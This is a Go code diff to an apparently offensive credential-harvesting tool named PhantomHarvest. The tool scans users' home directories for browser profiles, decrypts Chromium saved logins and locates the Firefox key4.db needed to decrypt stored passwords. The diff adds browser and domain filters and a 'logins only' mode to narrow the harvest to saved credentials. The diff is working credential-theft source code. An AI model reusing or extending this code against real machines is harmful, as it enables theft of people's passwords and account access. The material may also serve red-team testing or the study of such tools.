@@ -11,6 +11,7 @@ import (
 	"github.com/phantom-offensive/PhantomHarvest/internal/decrypt"
 )
 
+
 // Browser profile paths by OS
 type browserProfile struct {
 	name    string
@@ -123,8 +124,18 @@ func (s *Scanner) scanBrowsers() {
 	homes := findHomeDirs(s.root)
 	profiles := getBrowserProfiles()
 
+	// Apply domain filter to the decrypt package before scanning.
+	if s.DomainFilter != "" {
+		decrypt.SetDomainFilter(s.DomainFilter)
+	}
+
 	for _, home := range homes {
 		for _, browser := range profiles {
+			// Browser filter: skip browsers not in the allow-list.
+			if len(s.BrowserFilter) > 0 && !browserAllowed(browser.name, s.BrowserFilter) {
+				continue
+			}
+
 			for _, relPath := range browser.paths {
 				profileDir := filepath.Join(home, relPath)
 
@@ -144,6 +155,10 @@ func (s *Scanner) scanBrowsers() {
 					if !decrypted {
 						s.extractChromiumLogins(loginPath, browser.name)
 					}
+				}
+
+				if s.LoginsOnly {
+					continue
 				}
 
 				// Check for History (URLs with auth)
@@ -167,6 +182,17 @@ func (s *Scanner) scanBrowsers() {
 			}
 		}
 	}
+}
+
+// browserAllowed returns true if name (case-insensitive) is in the filter list.
+func browserAllowed(name string, filter []string) bool {
+	nameLower := strings.ToLower(name)
+	for _, f := range filter {
+		if strings.ToLower(f) == nameLower {
+			return true
+		}
+	}
+	return false
 }
 
 // decryptChromiumProfile invokes the decrypt package and converts results
@@ -267,6 +293,10 @@ func (s *Scanner) scanFirefoxProfiles(profilesDir string, browser browserProfile
 				Value:      "(key4.db — needed to decrypt logins.json)",
 				Confidence: ConfHigh,
 			})
+		}
+
+		if s.LoginsOnly {
+			continue
 		}
 
 		// History
